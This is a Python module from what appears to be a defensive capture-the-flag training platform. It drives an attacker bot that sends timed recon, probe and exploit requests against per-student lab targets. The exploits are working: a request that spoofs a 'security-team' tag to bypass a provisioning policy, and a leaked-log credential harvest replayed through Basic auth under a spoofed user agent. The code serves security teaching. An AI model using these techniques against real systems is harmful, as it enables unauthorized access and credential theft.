"""Three-target mode for attacker-bot (ctf-defend redesign; docs/ctf-defend-build-contract.md).

Active only when CTF_DEFEND_TARGETS lists several targets. After the facilitator's Start each student
thread fetches its own schedule row from ctf-controller (`GET /schedule?user=`, Bearer
CTF_CONTROL_TOKEN) and runs each target as an independent timer at t0 + start_offset_s (scaled by
CTF_TIME_SCALE): the same recon -> probe -> exploit shape as the single-target swarm
(personas.Swarm/Attacker), against that target's own URL
    http://CTF_HOST:CTF_HOST_PORT_BASE + target_index * CTF_PORT_STRIDE + user_index.

Whatever the exploit request really got back is what is posted: `status`, and `outcome`/`klass`
are derived from it, never assumed. Stdlib only.
"""
import base64
import json
import os
import random
import re
import sys
import threading
import time
import urllib.error
import urllib.parse
import urllib.request

import personas
import traffic

# Same dance as bot.py: the built image has it at ./exploit/ (Dockerfile COPYs it there);
# a repo checkout (tests, dev) keeps it under targets/customer-portal/exploit/ instead.
_HERE = os.path.dirname(os.path.abspath(__file__))
for _candidate in (os.path.join(_HERE, "exploit"),
                   os.path.join(_HERE, "..", "targets", "customer-portal", "exploit")):
    if os.path.isdir(_candidate) and _candidate not in sys.path:
        sys.path.insert(0, _candidate)

POLICY_UAS = ("python-requests/2.31.0", "curl/7.88.1")
OPS_UA = "ops-dashboard/2.4 (+internal)"          # the ops dashboard's own agent: never in noise
LEAK_RE = re.compile(r"user=(?P<user>\S+) pass=(?P<pw>\S+)")
PROTECTED_RG = "rg-vault-gateway"
TIMEOUT = 5


def parse_targets(raw):
    return [t for t in (raw or "").replace(",", " ").split() if t]


def target_port(base, index, stride, user_index):
    return base + index * stride + user_index


def schedule_rows(doc, user):
    """The user's [{target, index, severity, weight, start_offset_s}] out of whichever shape the
    controller answered: a bare list, {"targets"|"schedule"|"rows": [...]}, or the full
    {"users": {user: [...]}} document."""
    if isinstance(doc, list):
        rows = doc
    elif isinstance(doc, dict):
        rows = None
        for k in ("targets", "schedule", "rows"):
            if isinstance(doc.get(k), list):
                rows = doc[k]
                break
        if rows is None and isinstance(doc.get("users"), dict):
            rows = doc["users"].get(user)
    else:
        rows = None
    return [r for r in (rows or []) if isinstance(r, dict) and r.get("target")]


def fetch_schedule(addr, token, user, timeout=TIMEOUT, opener=urllib.request.urlopen):
    req = urllib.request.Request(f"{addr.rstrip('/')}/schedule?user={urllib.parse.quote(user)}",
                                 headers={"Authorization": f"Bearer {token}"})
    try:
        with opener(req, timeout=timeout) as resp:
            return schedule_rows(json.loads(resp.read()), user)
    except (urllib.error.URLError, OSError, ValueError, TimeoutError):
        return []


# -- raw requests (what the target really answered) -----------------------------------------
def _call(method, url, body=None, headers=None, timeout=TIMEOUT):
    """One real HTTP call. Returns (status, bytes, parsed-json-or-None); an HTTPError still has
    a status and a body, an operational failure (refused/timeout) is status None."""
    data = json.dumps(body).encode() if body is not None else None
    hdrs = dict(headers or {})
    if data is not None:
        hdrs.setdefault("Content-Type", "application/json")
    req = urllib.request.Request(url, data=data, method=method, headers=hdrs)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            raw = resp.read()
            status = resp.status
    except urllib.error.HTTPError as exc:
        raw, status = exc.read(), exc.code
    except (urllib.error.URLError, OSError, ValueError, TimeoutError):
        return None, 0, None
    try:
        parsed = json.loads(raw.decode("utf-8", "replace")) if raw else None
    except ValueError:
        parsed = None
    return status, len(raw), parsed


# -- customer-portal: unchanged (traffic.py's existing scan/probe/exploit shape) -------------
def customer_portal_request(url, outcome, exploit_fn, rng):
    """Same request shapes the single-target bot already posts; only the dispatch (per-target
    timers, own URL) is new in this module."""
    if outcome in ("recon", "probe"):
        return traffic.request_for(outcome, rng)
    import dump as dump_mod
    try:
        observed = exploit_fn()
        breached = bool(observed and observed.get("rows"))
    except Exception:  # noqa: BLE001 - an operational hiccup is not a verdict
        observed, breached = None, False
    rec = traffic.exploit_request(urllib.parse.urlencode({"q": dump_mod.PAYLOAD}), observed, breached, rng)
    outcome = "dump_success" if breached else outcome
    return rec, outcome


# -- policy-bypass: denied attempts, then an allowed protected write through the proxy -------
def policy_bypass_request(url, phase, sectm_key, rng):
    """One request against the proxy (port 5000): a developer-tagged attempt at the protected
    resource group (denied, until detonation), benign sandbox/security-team writes throughout,
    and - once detonated - the real exploit: a developer call that self-reports
    `tags['provisioned-by']='security-team'`, which `check.py`'s same flaw lets through. `caller`
    reports the actual header the proxy set (`X-Caller-Role`), never assumed."""
    ua = rng.choice(POLICY_UAS)
    benign = rng.random() < 0.3
    if phase != "red" and not benign:
        body = {"name": f"probe-{rng.randrange(10**6)}", "resourceGroup": PROTECTED_RG,
                "tags": {"provisioned-by": "developer"},
                "properties": {"containers": [{"name": "c1", "properties": {"image": "n/a"}}]}}
        status, size, parsed = _call("POST", url + "/api/provision", body)
        rec = {"method": "POST", "path": "/api/provision", "status": status or 502, "bytes": size,
               "ua": ua, "caller": "developer", "resource_group": PROTECTED_RG, "outcome": "denied",
               "asserted_tag": "developer", "klass": "policy-probe"}
        return rec, "probe"
    if benign:
        group = rng.choice(("rg-sandbox", PROTECTED_RG))
        as_security = group == PROTECTED_RG
        headers = {"Authorization": f"Bearer {sectm_key}"} if as_security else {}
        body = {"name": f"benign-{rng.randrange(10**6)}", "resourceGroup": group,
                "tags": {"provisioned-by": "security-team" if as_security else "developer"},
                "properties": {"containers": [{"name": "c1", "properties": {"image": "n/a"}}]}}
        status, size, parsed = _call("POST", url + "/api/provision", body, headers)
        rec = {"method": "POST", "path": "/api/provision", "status": status or 502, "bytes": size,
               "ua": ua, "caller": "security-team" if as_security else "developer",
               "resource_group": group, "outcome": "allowed" if (status or 0) == 201 else "denied",
               "asserted_tag": "security-team" if as_security else "developer", "klass": "benign"}
        return rec, "recon"
    # The exploit: a developer request that lies about its own tag.
    body = {"name": f"exploit-{rng.randrange(10**6)}", "resourceGroup": PROTECTED_RG,
            "tags": {"provisioned-by": "security-team"},
            "properties": {"containers": [{"name": "c1", "properties": {"image": "n/a"}}]}}
    status, size, parsed = _call("POST", url + "/api/provision", body)
    allowed = (status or 0) == 201
    rec = {"method": "POST", "path": "/api/provision", "status": status or 502, "bytes": size, "ua": ua,
           "caller": "developer", "resource_group": PROTECTED_RG, "outcome": "allowed" if allowed else "denied",
           "asserted_tag": "security-team", "klass": "exploit" if allowed else "policy-probe"}
    outcome = "dump_success" if allowed else "exploit_attempt"
    return rec, outcome


# -- leaky-config: benign polls, unauthenticated log read, then credential reuse ------------
def leaky_config_request(url, phase, rng):
    """Benign /status + /healthz polls throughout; an unauthenticated read of the admin log
    once escalating; on detonation, the credentials it leaked replayed against the protected
    endpoint with the ops dashboard's own user agent (never seen in the benign traffic)."""
    if phase == "green" or rng.random() < 0.3:
        path = rng.choice(("/status", "/healthz"))
        status, size, _ = _call("GET", url + path)
        rec = {"method": "GET", "path": path, "status": status or 502, "bytes": size, "auth": "none",
               "account": None, "ua": rng.choice(POLICY_UAS), "klass": "benign"}
        return rec, "recon"
    if phase != "red":
        status, size, body_text = _call("GET", url + "/admin/logs/app.log")
        rec = {"method": "GET", "path": "/admin/logs/app.log", "status": status or 502, "bytes": size,
               "auth": "none", "account": None, "ua": rng.choice(POLICY_UAS), "klass": "probe"}
        return rec, "probe"
    status, size, body_text = _call("GET", url + "/admin/logs/app.log")
    raw = json.dumps(body_text) if isinstance(body_text, (dict, list)) else (body_text or "")
    m = LEAK_RE.search(raw if isinstance(raw, str) else "")
    if not m:
        rec = {"method": "GET", "path": "/admin/logs/app.log", "status": status or 502, "bytes": size,
               "auth": "none", "account": None, "ua": rng.choice(POLICY_UAS), "klass": "probe"}
        return rec, "exploit_attempt"
    user, pw = m.group("user"), m.group("pw")
    basic = base64.b64encode(f"{user}:{pw}".encode()).decode()
    status2, size2, _ = _call("GET", url + "/internal/metrics", headers={"Authorization": f"Basic {basic}"})
    breached = status2 == 200
    rec = {"method": "GET", "path": "/internal/metrics", "status": status2 or 502, "bytes": size2,
           "auth": "basic-ok" if breached else "basic-fail", "account": user if breached else None,
           "ua": OPS_UA, "klass": "exploit" if breached else "probe"}
    outcome = "dump_success" if breached else "exploit_attempt"
    return rec, outcome


REQUEST_FNS = {
    "customer-portal": "customer_portal",
    "policy-bypass": "policy_bypass",
    "leaky-config": "leaky_config",
}


def make_request(target, url, phase, exploit_fn, sectm_key, rng):
    """One request for TARGET at room PHASE ("green"|"yellow"|"red"), returning
    (record-dict, outcome). Unknown targets fall back to the plain scan/probe/exploit shape
    (traffic.py) so a fourth target added later degrades gracefully instead of erroring."""
    if target == "customer-portal":
        outcome = "recon" if phase == "green" else ("probe" if phase != "red" else "exploit_attempt")
        return customer_portal_request(url, outcome, exploit_fn, rng)
    if target == "policy-bypass":
        return policy_bypass_request(url, phase, sectm_key, rng)
    if target == "leaky-config":
        return leaky_config_request(url, phase, rng)
    outcome = "recon" if phase == "green" else "probe"
    return traffic.request_for(outcome, rng), outcome


def target_phase(now, start_at, dwell_seconds, ramp_seconds):
    elapsed = now - start_at
    if elapsed < 0:
        return "green"
    return personas.room_phase(elapsed - dwell_seconds, ramp_seconds)


def target_delay(phase, scale):
    if phase == "green":
        return random.uniform(personas.DELAY_MIN, personas.DELAY_MAX) * scale
    if phase == "yellow":
        return random.uniform(personas.RAMP_FLOOR, personas.DELAY_MAX) * scale
    return random.uniform(personas.RAMP_FLOOR, personas.RAMP_FLOOR * 3) * scale


def run_target_timer(user, user_index, row, host, port_base, stride, started_at, post, exploit_fn,
                     sectm_key, dwell_seconds, ramp_seconds, scale, clock=time.time, sleep=time.sleep,
                     rng=None, stop=None):
    """One target's independent timer for one student: sleeps until t0 + start_offset_s (scaled),
    then runs recon/probe/exploit requests against this target's URL until STOP() is true (or
    forever when STOP is None - the caller's process lifetime)."""
    rng = rng or random.Random()
    target = row["target"]
    index = int(row.get("index", 0))
    url = f"http://{host}:{target_port(port_base, index, stride, user_index)}"
    t0 = started_at + float(row.get("start_offset_s", 0)) * scale
    while clock() < t0:
        if stop and stop():
            return
        sleep(min(1.0, max(0.05, t0 - clock())))
    while not (stop and stop()):
        phase = target_phase(clock(), t0, dwell_seconds, ramp_seconds)
        rec, outcome = make_request(target, url, phase, exploit_fn, sectm_key, rng)
        post(user, target, outcome, rec)
        sleep(max(0.5, target_delay(phase, scale)))